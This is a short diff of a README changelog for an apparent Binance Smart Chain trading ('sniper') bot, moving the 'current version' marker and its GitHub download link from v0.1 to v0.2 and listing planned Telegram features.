@@ -31,10 +31,10 @@ enjoy
 
 Change LOG:
 
-v0.1 - initial release. - (Current version) - Download - https://github.com/tustiicine/bsc-sniper-smart-contract-bot/archive/refs/heads/main.zip
+v0.1 - initial release. 
 
-v0.2 - add auto-withdrawl when profit reach x amount. select withdraw type: profit only / all balance. - (coming soon)
-
+v0.2 - add auto-withdrawl when profit reach x amount. select withdraw type: profit only / all balance. - (Current Version) 
+- Download - https://github.com/tustiicine/bsc-sniper-smart-contract-bot/archive/refs/heads/main.zip
 v0.3 - implementation of telegram bot that notify about trades. - (coming soon)
 
 v0.4 - add control panel to telegram bot for easy managing smart-contract bot. - (coming soon)
